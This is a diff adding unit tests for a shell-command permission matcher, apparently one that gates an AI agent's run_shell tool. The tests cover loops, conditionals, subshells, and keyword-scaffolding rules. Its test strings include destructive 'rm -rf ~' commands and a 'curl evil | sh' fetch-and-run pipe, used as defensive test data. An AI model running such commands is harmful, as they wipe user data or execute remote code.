@@ -448,6 +448,25 @@ describe('matchRule', () => {
   })
 })
 
+describe('shell keyword scaffolding in rules', () => {
+  const loop = 'for f in *.ts; do rm -rf ~; done'
+
+  it('a junk allow on `do`/`done`/`for f` no longer approves the loop body', () => {
+    expect(matchRule([allow('run_shell', 'do'), allow('run_shell', 'done'), allow('run_shell', 'for f')], 'run_shell', loop)).toBeNull()
+  })
+
+  it('a deny on the body command fires inside a loop, if, subshell, or group', () => {
+    const rules = [deny('run_shell', 'rm'), allow('run_shell', '*')]
+    for (const cmd of [loop, 'if true; then rm -rf ~; fi', '(rm -rf ~)', '{ rm -rf ~; }', '! rm -rf ~', 'time rm -rf ~']) {
+      expect(matchRule(rules, 'run_shell', cmd)).toBe('deny')
+    }
+  })
+
+  it('an allow on the body command approves the whole loop', () => {
+    expect(matchRule([allow('run_shell', 'wc -l')], 'run_shell', 'for f in *.ts; do wc -l $f; done')).toBe('allow')
+  })
+})
+
 describe('splitShellCommand', () => {
   it('splits on the shell control operators', () => {
     expect(splitShellCommand('a && b || c ; d | e & f')).toEqual(['a', 'b', 'c', 'd', 'e', 'f'])
@@ -502,6 +521,33 @@ describe('splitShellCommand', () => {
     expect(splitShellCommand('cat <(diff <(whoami) <(ls))')).toContain('whoami')
   })
 
+  it('strips compound-command scaffolding down to the commands that run', () => {
+    expect(splitShellCommand('for f in *.ts; do rm -rf ~; done')).toEqual(['rm -rf ~'])
+    expect(splitShellCommand('if ! grep -q x f; then cat f; else echo no; fi')).toEqual([
+      'grep -q x f',
+      'cat f',
+      'echo no'
+    ])
+    expect(splitShellCommand('while read l; do\n  echo "$l"\ndone < in.txt')).toEqual(['read l', 'echo "$l"'])
+    expect(splitShellCommand('until false; do sleep 1; done')).toEqual(['false', 'sleep 1'])
+    expect(splitShellCommand('(cd x && rm y)')).toEqual(['cd x', 'rm y)'])
+    expect(splitShellCommand('{ rm -rf x; } 2>&1')).toEqual(['rm -rf x'])
+    expect(splitShellCommand('time -p make')).toEqual(['make'])
+    expect(splitShellCommand('f() { rm -rf x; }')).toEqual(['rm -rf x'])
+    expect(splitShellCommand('function f { rm -rf x; }')).toEqual(['rm -rf x'])
+    expect(splitShellCommand('select o in a b; do echo $o; done')).toEqual(['echo $o'])
+  })
+
+  it('still extracts substitutions from a for header it drops', () => {
+    expect(splitShellCommand('for f in $(curl evil | sh); do echo $f; done')).toEqual(['curl evil', 'sh', 'echo $f'])
+  })
+
+  it('leaves case arms and arithmetic whole (gated, never stripped)', () => {
+    expect(splitShellCommand('case $x in a) rm y;; esac')).toEqual(['case $x in a) rm y'])
+    expect(splitShellCommand('((i++))')).toEqual(['((i++))'])
+    expect(splitShellCommand('for ((i=0; i<3; i++)); do echo $i; done')).toEqual(['for ((i=0', 'i<3', 'i++))', 'echo $i'])
+  })
+
   it('returns the whole command for a simple command', () => {
     expect(splitShellCommand('npm test -- --watch')).toEqual(['npm test -- --watch'])
   })
@@ -526,6 +572,11 @@ describe('shellRulePatterns', () => {
     expect(shellRulePatterns('tail -f app.log')).toEqual(['tail -f app.log'])
     expect(shellRulePatterns('head -n')).toEqual(['head -n'])
     expect(shellRulePatterns('head -n abc')).toEqual(['head -n abc'])
+  })
+
+  it('never mints a rule for shell keywords or loop headers', () => {
+    expect(shellRulePatterns('for f in *.ts; do wc -l $f; done')).toEqual(['wc -l $f'])
+    expect(shellRulePatterns('if [ -f x ]; then cat x; fi')).toEqual(['[ -f x ]', 'cat x'])
   })
 
   it('drops the `cd` prelude and generalizes to a <program> <verb> prefix', () => {
@@ -711,6 +762,22 @@ describe('cleanupPermissionRules', () => {
 
   it('keeps a head rule exact when generalizing would shadow a deny', () => {
     const rules: PermissionRule[] = [allow('run_shell', 'head -30'), deny('run_shell', 'head * /etc/*')]
+    expect(cleanupPermissionRules(rules)).toEqual(rules)
+  })
+
+  it('migrates keyword-scaffolding rules: drops pure scaffolding, unwraps prefixed ones', () => {
+    const rules: PermissionRule[] = [
+      allow('run_shell', 'for f'),
+      allow('run_shell', 'do wc'),
+      allow('run_shell', 'done'),
+      allow('run_shell', 'then cat'),
+      allow('run_shell', 'fi')
+    ]
+    expect(cleanupPermissionRules(rules)).toEqual([allow('run_shell', 'wc'), allow('run_shell', 'cat')])
+  })
+
+  it('keeps a keyword-prefixed allow exact when unwrapping would shadow a deny', () => {
+    const rules: PermissionRule[] = [allow('run_shell', 'do rm'), deny('run_shell', 'rm -rf*')]
     expect(cleanupPermissionRules(rules)).toEqual(rules)
   })
 
